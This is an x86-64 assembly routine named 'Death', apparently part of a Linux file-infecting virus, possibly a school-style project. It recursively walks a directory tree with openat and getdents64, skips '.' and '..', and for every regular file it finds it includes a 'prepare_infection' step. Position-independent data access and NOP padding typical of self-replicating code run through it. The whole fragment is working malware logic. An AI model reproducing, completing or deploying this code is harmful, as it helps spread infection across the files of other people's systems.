	Death:
		push	r12
		push	rax
		push	rcx
		push	rsi
		push	rdi
		push	rdx

		mov		rsi, [rbp + 16]
		add		rsi, mydata.path
		;lea		rsi, [rel path]
		;call	[rbp + 40]
		;call	printf ;here

		mov		rdi, [rbp + 16]
		add		rdi, mydata.buff
		;lea		rdi, [rel buff]
		mov		rcx, 512
		xor		rax, rax
		NOP
		NOP
		NOP
		NOP
		rep		stosq

		mov		rax, SYS_openat
		mov		rdi, AT_FDCWD
		mov		rsi, [rbp + 16]
		add		rsi, mydata.path
		;lea		rsi, [rel path]
		xor		rdx, rdx
		NOP
		NOP
		NOP
		NOP
		xor		r10, r10
		NOP
		NOP
		NOP
		NOP
		syscall
		mov		r12, rax
		mov		rdi, rax
		push	rdi

	;SYS_getdents64
	;struct linux_dirent64 {
    ;ino64_t        d_ino;     // 8 bytes : numéro d'inode
    ;off64_t        d_off;     // 8 bytes : offset du prochain dirent
    ;unsigned short d_reclen;  // 2 bytes : taille de cette entrée
    ;unsigned char  d_type;    // 1 byte  : type de fichier
    ;char           d_name[];  // nom du fichier (null-terminated)
	;};

		mov		rax, SYS_getdents64

		mov		rsi, [rbp + 16]
		add		rsi, mydata.buff
		;lea		rsi, [rel buff]
		mov		rdx, 4096
		syscall
		;call	print_rax
		mov		rdx, rax
		xor		rdi, rdi
		NOP
		NOP
		NOP
		NOP
		.loop:
			cmp		rdx, rdi
			jle		.done

			add		rdi, 16
			push	rbx
			mov		rbx, [rbp + 16]
			add		rbx, mydata.buff
			;lea		rbx, [rel buff]
			movzx	rcx, word [rbx + rdi]
			add		rdi, 2
			movzx	rax, byte [rbx + rdi]
			pop		rbx
			add		rdi, 1
			sub		rcx, 19
			add		rdi, rcx
			add		rsi, 19

			cmp		rax, 4
			jne		.file
			push	rsi
			push	rcx
			push	rdi
			mov		rcx, 2
			mov		rdi, [rbp + 16]
			add		rdi, mydata.curr
			;lea		rdi, [rel curr]
			repe	cmpsb
			pop		rdi
			pop		rcx
			pop		rsi
			je		.no_print
			push	rsi
			push	rcx
			push	rdi
			mov		rcx, 3
			mov		rdi, [rbp + 16]
			add		rdi, mydata.last
			;lea		rdi, [rel last]
			repe	cmpsb
			pop		rdi
			pop		rcx
			pop		rsi
			je		.no_print
			; Ici seulement les files

			push	rdi
			push	rsi
			push	rax
			mov		rdi, [rbp + 16]
			add		rdi, mydata.path
			;lea		rdi, [rel path]
			xchg	rsi, rdi
			%include "functions/add_val.s"
			;call	add_val
			pop		rax
			pop		rsi
			pop		rdi

			call	[rbp + 32]

			push	rsi
			mov		rsi, [rbp + 16]
			add		rsi, mydata.path
			;lea		rsi, [rel path]
			%include "functions/sub_val0.s"
			;call	sub_val
			pop		rsi

			push	rax
			push	rcx
			push	rsi
			push	rdi
			push	rdx
			mov		rdi, [rbp + 16]
			add		rdi, mydata.buff
			;lea		rdi, [rel buff]
			mov		rcx, 512
			xor		rax, rax
			NOP
			NOP
			NOP
			NOP
			rep		stosq

			mov		rax, SYS_close
			mov		rdi, r12
			syscall

			mov		rax, SYS_openat
			mov		rdi, AT_FDCWD
			mov		rsi, [rbp + 16]
			add		rsi, mydata.path
			;lea		rsi, [rel path]
			xor		rdx, rdx
			NOP
			NOP
			NOP
			NOP
			xor		r10, r10
			NOP
			NOP
			NOP
			NOP
			syscall

			mov		rdi, rax
			mov		rax, SYS_getdents64
			mov		rsi, [rbp + 16]
			add		rsi, mydata.buff
			;lea		rsi, [rel buff]
			mov		rdx, 4096
			syscall
			pop		rdx
			pop		rdi
			pop		rsi
			pop		rcx
			pop		rax

			jmp		.no_print
		.file:
			;call	printf ;logique des fichier

			push	rdi
			push	rsi
			push	rax
			mov		rdi, [rbp + 16]
			add		rdi, mydata.path
			;lea		rdi, [rel path]
			xchg	rsi, rdi
			%include "functions/add_val0.s"
			pop		rax
			pop		rsi
			pop		rdi

			mov		rax, [rbp + 16]
			add		rax, mydata.path
			mov		rax, [rax + 1]
			cmp		al, 0
			je		.error

			%include "functions/prepare_infection.s"
			;call	prepare_infection

		.no_print:
			add		rsi, rcx
			jmp		.loop
		.error:

		.done:

		pop		rdi
		mov		rax, SYS_close
		syscall
		pop		rdx
		pop		rdi
		pop		rsi
		pop		rcx
		pop		rax
		pop		r12
	ret
